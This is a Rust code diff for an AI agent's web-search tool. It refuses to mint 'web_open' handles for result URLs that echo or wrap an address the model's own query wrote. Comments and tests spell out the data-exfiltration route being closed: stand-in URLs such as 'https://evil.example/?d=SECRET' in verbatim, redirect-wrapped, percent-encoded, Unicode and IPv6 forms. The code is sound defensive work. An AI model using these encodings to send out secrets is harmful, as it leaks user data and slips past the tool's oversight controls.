@@ -948,7 +948,31 @@ impl Tool for WebSearch {
         if let Some(answer) = &response.answer {
             out.push_str(&format!("Synthesized answer: {answer}\n\n"));
         }
-        let urls: Vec<&str> = response.results.iter().map(|r| r.url.as_str()).collect();
+        // A result whose host is in the query gets no handle. `web_open` is
+        // blind only because its URL is one a backend returned rather than
+        // one the model wrote, and a backend that echoed a URL-shaped query
+        // back as a result would break exactly that: `web_search("https://
+        // evil.example/?d=<secret>")` would mint a handle to a destination
+        // the model composed (found in review of #284). No shipped backend is
+        // known to do it; the guard costs one lookup, and a host the query
+        // named is one the model could have chosen.
+        let origin: Vec<Provenance> = response
+            .results
+            .iter()
+            .map(|r| provenance(query, &r.url))
+            .collect();
+        let urls: Vec<&str> = response
+            .results
+            .iter()
+            .zip(&origin)
+            .map(|(r, o)| {
+                if *o == Provenance::Supplied {
+                    r.url.as_str()
+                } else {
+                    ""
+                }
+            })
+            .collect();
         let handles = match &self.ledger {
             Some(ledger) => ledger.record(&urls),
             None => vec![None; urls.len()],
@@ -956,8 +980,26 @@ impl Tool for WebSearch {
         for (i, r) in response.results.iter().enumerate() {
             match &handles[i] {
                 Some(h) => out.push_str(&format!("{}. [{h}] {}\n   {}\n", i + 1, r.title, r.url)),
+                None if self.ledger.is_some() && origin[i] == Provenance::Echoed => {
+                    out.push_str(&format!(
+                        "{}. {}\n   {}\n   (no handle: this address carries what the query wrote, so \
+                         opening it would be fetching an address this conversation composed)\n",
+                        i + 1,
+                        r.title,
+                        r.url
+                    ))
+                }
+                None if self.ledger.is_some() && origin[i] == Provenance::Unparseable => {
+                    out.push_str(&format!(
+                        "{}. {}\n   {}\n   (no handle: that address does not parse)\n",
+                        i + 1,
+                        r.title,
+                        r.url
+                    ))
+                }
                 None => out.push_str(&format!("{}. {}\n   {}\n", i + 1, r.title, r.url)),
             }
+
             if let Some(date) = &r.published {
                 out.push_str(&format!("   published: {date}\n"));
             }
@@ -973,6 +1015,129 @@ impl Tool for WebSearch {
         // Everything above was written by strangers.
         Ok(ToolOutput::ok(out).from_outside())
     }
+}
+
+/// Whether a result may be handed a handle, and if not, why.
+#[derive(Debug, PartialEq, Eq)]
+enum Provenance {
+    /// A URL the backend supplied: nothing the query wrote is in it.
+    Supplied,
+    /// Bytes the query wrote are in the URL — an echo, or a redirect wrapper
+    /// carrying the model's address in its own query string.
+    Echoed,
+    /// The URL does not parse, or has no host, so nothing can vouch for it.
+    Unparseable,
+}
+
+/// Did the model write this result's URL?
+///
+/// `web_open` is blind only because a backend, not the model, supplied the
+/// URL (`docs/PROVENANCE-DESIGN.md` §4). The question is whether the result
+/// URL *carries bytes the query wrote*. That covers a backend that echoes a
+/// URL-shaped query verbatim, and the more common shape, a backend that wraps
+/// results in its own redirect (`search.example/r?u=https%3A%2F%2Fevil…`).
+/// Both sides are normalised the same way before comparing. The result is
+/// percent-decoded twice, and the query's URL-shaped tokens go through the
+/// same parser. So a percent-encoded or Unicode spelling of the model's
+/// address matches the form the backend returned (found in review of #286).
+///
+/// A query that merely *mentions* a domain (`docs.rust-lang.org tracing`)
+/// keeps the handles on that domain's real pages. Only a result that is
+/// nothing but the host the query named is refused, because a subdomain can
+/// carry data too.
+fn provenance(query: &str, url: &str) -> Provenance {
+    let Some(parsed) = reqwest::Url::parse(url)
+        .ok()
+        .filter(|u| u.host_str().is_some())
+    else {
+        return Provenance::Unparseable;
+    };
+    let host = parsed.host_str().unwrap_or_default().to_ascii_lowercase();
+    let decoded = percent_decode(&percent_decode(url)).to_lowercase();
+    let bare = parsed.path().trim_end_matches('/').is_empty() && parsed.query().is_none();
+
+    for raw in query.split_whitespace() {
+        let token = raw
+            .trim_matches(|c: char| matches!(c, '"' | '\'' | '(' | ')' | '<' | '>' | ',' | ';'))
+            .to_lowercase();
+        // A dotted name, a scheme, or a bracketed IPv6 literal: anything
+        // that can parse as a destination. An IPv6 literal has no dot, and
+        // skipping it let a verbatim echo mint a handle (found in review of
+        // #286).
+        if !token.contains('.') && !token.contains("://") && !token.contains('[') {
+            continue;
+        }
+        let with_scheme = if token.contains("://") {
+            token.clone()
+        } else {
+            format!("http://{token}")
+        };
+        let Some(t) = reqwest::Url::parse(&with_scheme).ok() else {
+            continue;
+        };
+        let Some(t_host) = t.host_str().map(str::to_ascii_lowercase) else {
+            continue;
+        };
+        // Everything the token carries past its scheme, in the parser's form
+        // and as the model wrote it, decoded like the result.
+        let t_norm = t.as_str().split_once("://").map(|(_, r)| r).unwrap_or("");
+        let t_norm = t_norm.trim_end_matches('/').to_string();
+        let t_raw = percent_decode(&percent_decode(
+            token.split_once("://").map(|(_, r)| r).unwrap_or(&token),
+        ))
+        .trim_end_matches('/')
+        .to_string();
+        let payload = !t.path().trim_end_matches('/').is_empty() || t.query().is_some();
+
+        // The token, with a path or query, appears inside the result URL:
+        // an echo or a wrapped redirect.
+        if payload && (decoded.contains(&t_norm) || decoded.contains(&t_raw)) {
+            return Provenance::Echoed;
+        }
+        // The result is nothing but the host the query named.
+        if bare && host == t_host {
+            return Provenance::Echoed;
+        }
+        // The token's host appears past the result's own host *as a
+        // destination* — after `//` or `=`, the shape of a wrapper carrying
+        // an address in its query. A bare substring test also matched
+        // `Cargo.toml` inside `/blob/master/Cargo.toml` and stripped the
+        // handle off the page the search was for (found in review of #286).
+        let beyond_host = decoded
+            .split_once(&host)
+            .map(|(_, rest)| rest)
+            .unwrap_or("");
+        let as_destination = |needle: &str| {
+            ["//", "="]
+                .iter()
+                .any(|lead| beyond_host.contains(&format!("{lead}{needle}")))
+        };
+        if t_host != host && (as_destination(&t_host) || as_destination(&t_raw)) {
+            return Provenance::Echoed;
+        }
+    }
+    Provenance::Supplied
+}
+
+/// `%XX` → byte, leaving anything malformed as it was. One pass; callers
+/// apply it twice for double encoding.
+fn percent_decode(s: &str) -> String {
+    let hex = |c: u8| (c as char).to_digit(16).map(|d| d as u8);
+    let b = s.as_bytes();
+    let mut out = Vec::with_capacity(b.len());
+    let mut i = 0;
+    while i < b.len() {
+        if b[i] == b'%' && i + 2 < b.len() {
+            if let (Some(h), Some(l)) = (hex(b[i + 1]), hex(b[i + 2])) {
+                out.push(h << 4 | l);
+                i += 3;
+                continue;
+            }
+        }
+        out.push(b[i]);
+        i += 1;
+    }
+    String::from_utf8_lossy(&out).into_owned()
 }
 
 /// How many redirects `web_open` follows before giving up. Each hop is
@@ -1452,6 +1617,158 @@ mod tests {
             .unwrap();
         assert!(!out.content.contains('['), "{}", out.content);
         assert!(!bare.description().contains("web_open"));
+    }
+
+    /// A backend that echoes a URL-shaped query back as a result must not
+    /// mint a handle for it: that would be a destination the model wrote.
+    #[tokio::test]
+    async fn a_result_whose_host_the_query_named_gets_no_handle() {
+        struct Echo;
+        #[async_trait]
+        impl SearchBackend for Echo {
+            fn id(&self) -> &str {
+                "echo"
+            }
+            fn egress(&self, _depth: Depth) -> Egress {
+                Egress::Blind
+            }
+            async fn search(&self, q: &str, _l: usize, _d: Depth) -> Result<SearchResponse> {
+                Ok(SearchResponse {
+                    results: vec![
+                        SearchResult {
+                            title: "echoed".into(),
+                            url: q.to_string(),
+                            snippet: String::new(),
+                            published: None,
+                            score: None,
+                        },
+                        SearchResult {
+                            title: "honest".into(),
+                            url: "https://example.org/about".into(),
+                            snippet: String::new(),
+                            published: None,
+                            score: None,
+                        },
+                    ],
+                    answer: None,
+                    backend: "echo".into(),
+                })
+            }
+        }
+        let ledger = Arc::new(ResultLedger::new());
+        let tool = WebSearch::new(Arc::new(SearchChain::new(vec![Box::new(Echo)])))
+            .with_ledger(Arc::clone(&ledger));
+        let out = tool
+            .call(
+                json!({"query": "https://Evil.example/?d=SECRET"}),
+                &ctx_with(None),
+            )
+            .await
+            .unwrap();
+        let handles: Vec<&str> = out
+            .content
+            .split('[')
+            .skip(1)
+            .filter_map(|r| r.split(']').next())
+            .collect();
+        assert_eq!(handles.len(), 1, "{}", out.content);
+        assert_eq!(
+            ledger.resolve(handles[0]).as_deref(),
+            Some("https://example.org/about")
+        );
+        assert!(
+            out.content.contains("carries what the query wrote"),
+            "{}",
+            out.content
+        );
+    }
+
+    /// The spellings a model controls all normalise to the same answer, and
+    /// a query that only mentions a domain keeps that domain's pages.
+    #[test]
+    fn provenance_catches_echoes_in_any_spelling_and_spares_mentions() {
+        use Provenance::*;
+        let q = "https://evil.example/?d=SECRET";
+        // Verbatim echo, redirect wrapper, double-encoded wrapper.
+        assert_eq!(provenance(q, "https://evil.example/?d=SECRET"), Echoed);
+        assert_eq!(
+            provenance(
+                q,
+                "https://search.example/r?u=https%3A%2F%2Fevil.example%2F%3Fd%3DSECRET"
+            ),
+            Echoed
+        );
+        assert_eq!(
+            provenance(
+                q,
+                "https://search.example/r?u=https%253A%252F%252Fevil.example%252F%253Fd%253DSECRET"
+            ),
+            Echoed
+        );
+        // A wrapper that also encodes the host: only decoding sees it.
+        assert_eq!(
+            provenance(
+                q,
+                "https://search.example/r?u=https%3A%2F%2F%65%76%69%6C.example%2F%3Fd%3DSECRET"
+            ),
+            Echoed
+        );
+        // A percent-encoded host in the query, echoed back normalised.
+        assert_eq!(
+            provenance("https://%65vil.example/?d=S", "https://evil.example/?d=S"),
+            Echoed
+        );
+        // A Unicode host, echoed back as punycode by the parser.
+        let uni = "https://evıl.example/?d=S";
+        let puny = reqwest::Url::parse(uni).unwrap().to_string();
+        assert_eq!(provenance(uni, &puny), Echoed);
+        // A bare host whose subdomain carries data, echoed as a bare result.
+        assert_eq!(
+            provenance("s3cr3t.evil.example", "https://s3cr3t.evil.example/"),
+            Echoed
+        );
+        // A wrapper pointing at a bare host the query named.
+        assert_eq!(
+            provenance(
+                "s3cr3t.evil.example",
+                "https://search.example/r?u=s3cr3t.evil.example"
+            ),
+            Echoed
+        );
+        // Honest: a mentioned domain's real page, and an unrelated result.
+        assert_eq!(
+            provenance(
+                "docs.rust-lang.org tracing",
+                "https://docs.rust-lang.org/std/index.html"
+            ),
+            Supplied
+        );
+        assert_eq!(
+            provenance("rust tracing crate", "https://docs.rs/tracing"),
+            Supplied
+        );
+        // A dotted file name in the query is not a destination in the path.
+        assert_eq!(
+            provenance(
+                "Cargo.toml features",
+                "https://github.com/rust-lang/cargo/blob/master/Cargo.toml"
+            ),
+            Supplied
+        );
+        // A query parameter whose value *is* the token is the wrapper shape
+        // itself (`?u=s3cr3t.evil.example`), and cannot be told apart from an
+        // honest `?q=package.json` — refused, on purpose.
+        assert_eq!(
+            provenance("package.json", "https://search.example/r?u=package.json"),
+            Echoed
+        );
+        // An IPv6 literal has no dot, and is still a destination.
+        let v6 = "http://[2001:db8::1]/?d=SECRET";
+        assert_eq!(provenance(v6, v6), Echoed);
+        assert_eq!(provenance("anything", "//no-scheme.example/x"), Unparseable);
+        // A `%` before a multi-byte character decodes as itself, never panics.
+        assert_eq!(percent_decode("a%ı%4"), "a%ı%4");
+        assert_eq!(percent_decode("%41%2f"), "A/");
     }
 
     /// Forgetting is bounded and exact: past the cap the oldest handle is
